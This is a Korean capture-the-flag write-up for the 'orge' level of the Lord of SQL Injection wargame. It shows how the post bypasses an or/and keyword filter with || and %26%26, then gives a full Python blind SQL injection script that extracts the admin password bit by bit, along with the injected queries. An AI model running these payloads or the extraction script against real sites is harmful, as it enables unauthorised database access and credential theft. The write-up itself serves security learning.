<!DOCTYPE html>
<html>
<head>
        <link rel="stylesheet" type="text/css" href="sytle.css">
</head>
<body>
        <h1>Lord of SQL Injection orge Write-Up</h1>
</body>
<br>
<br>
</html>

문제를 살펴보자

![image](https://github.com/user-attachments/assets/67efb332-bcff-4b47-890e-60540580addf)

코드를 읽어보면 가장 먼저 눈에 띄는 부분은 
```python
if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe");
```

or와 and를 차단하고 있다.

그렇다면 or는 ||로, and는 &&(%26%26)로 대체할 수 있다.

이번 문제에서도 ```addslashes()```가 사용되고 있다. 

```python
if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orge");
```
또한 위 쿼리를 봤을 때 orc 문제와 마찬가지로 패스워드를 직접 알아내는 문제 같다.

```python
$query = "select id from prob_orge where id='guest' and pw='{$_GET[pw]}'"; 
echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
$result = @mysqli_fetch_array(mysqli_query($db,$query)); 
if($result['id']) echo "<h2>Hello {$result[id]}</h2>";
```
그리고 위에 쿼리를 살펴보면 싱글쿼터를 차단하고 있지 않다. 

orc 문제에서 했던 방법 그대로 풀면될 것 같다.

하지만 값을 하나하나 넣는게 너무 힘들었기 때문에 이번에는 파이썬으로 자동화 스크립트를 만들어 풀어보려 한다.

1. 초기값 설정
   
필요한 값들을 설정한다.

```python
from requests import get

url = 'https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php'
header = {'cookie' : 'PHPSESSID=자신의 쿠키값'}
```

2. pw 길이 확인

먼저 pw 값을 구하기 위해 pw 길이부터 구한다.

or와 and가 필터링되어 있기 때문에 각각 ||, &&을 사용한다.

그러나 url에서 &은 혼동이 올 수 있기 때문에 &대신에 아스키코드인 %26을 써준다.

```python
password_length = 0

while True:
    password_length += 1
    query = f"{url}/?pw=' || id='admin' %26%26 length(pw)={password_length}-- -"
    response=get(query, headers=header)
    if "<h2>" in response.text:
    	break
print(f"password_lengh : {password_length}")
```

pw 길이 확인 때 실행될 sql query

```python
select id from prob_orge where id='guest' and pw='' || id='admin' && length(pw)=1-- -'
```

3. pw의 각 문자 별 bit 길이 찾기

pw의 문자가 어떤 문자로 이루어져 있는지 모르기 때문에 bit열로 변환해서 추출하기 전에 길이를 알아야 한다.

ord도 or에 걸리기 때문에 ascii로 변경시킨다.

```python
for i in range(1, password_length + 1):
	bit_length = 0
	while True:
    	bit_length += 1
        query = f"{url}/?pw=' || id='admin' %26%26 length(bin(ascii(substr(pw, {i}, 1))))={bit_length}-- -"
        response=get(query, headers=header)
    	if "<h2>" in response.text:
    		break
    print(f"bit_number : {i}, length : {bit_length}")
```

각 문자열 bit 길이 확인할 때 실행될 sql query

```python
select id from prob_orge where id='guest' and pw='' || id='admin' && length(bin(ascii(substr(pw, 1, 1))))=1-- -'
```

4. pw의 각 문자 별 bit열 추출하기

pw의 bit열의 길이를 통해 bit열을 추출한다.

```python
bits = ""
for j in range(1, bit_length + 1):
	query = f"{url}/?pw=' || id='admin' %26%26 substr(bin(ascii(substr(pw, {i}, 1))), {j}, 1)= '1'-- -"
    response=get(query, headers=header)
    if "<h2>" in response.text:
    	bits += "1"
    else:
    	bits += "0"
print(f"bit_number : {i}, bit : {bits}")
```

pw의 bit열 추출할 때 실행될 sql query

```python
select id from prob_orge where id='guest' and pw='' || id='admin' && substr(bin(ascii(substr(pw, 1, 1))), 1, 1)= '1'-- -'
```

5. bit열을 문자열로 변환

bit열을 문자열로 변환하면 pw의 값이 나온다.

```python
password = ""
...
password += int.to_bytes(int(bits, 2), (bit_length + 7) // 8, "big").decode("utf-8")

print(password)
```

위 과정을 합치면 코드는 다음과 같다.

```python
from requests import get

url = 'https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php'
header = {'cookie' : 'PHPSESSID=자신의 쿠키값'} 

password_length = 0

while True:
    password_length += 1
    query = f"{url}/?pw=' || id='admin' %26%26 length(pw)={password_length}-- -"
    response = get(query, headers=header)
    if "<h2>" in response.text:
        break
print(f"password_length: {password_length}")

password = ""

for i in range(1, password_length + 1):
    bit_length = 0
    while True:
        bit_length += 1
        query = f"{url}/?pw=' || id='admin' %26%26 length(bin(ascii(substr(pw, {i}, 1))))={bit_length}-- -"
        response = get(query, headers=header)
        if "<h2>" in response.text:
            break
    print(f"bit_number: {i}, length: {bit_length}")
    
    bits = ""
    for j in range(1, bit_length + 1):
        query = f"{url}/?pw=' || id='admin' %26%26 substr(bin(ascii(substr(pw, {i}, 1))), {j}, 1)='1'-- -"
        response = get(query, headers=header)
        if "<h2>" in response.text:
            bits += "1"
        else:
            bits += "0"
    print(f"bit_number: {i}, bit: {bits}")
    
    password += int.to_bytes(int(bits, 2), (bit_length + 7) // 8, "big").decode("utf-8")

print(password)

```

코드를 실행하면 admin의 pw인 '7b751aec'를 얻을 수 있다.

![image](https://github.com/user-attachments/assets/d89fee37-071b-4719-b80b-47bd86eea313)

찾아낸 pw를 입력하면

![image](https://github.com/user-attachments/assets/c0ffaba4-646d-4b42-ade9-b3cdb12385c0)

Clear 했다!!
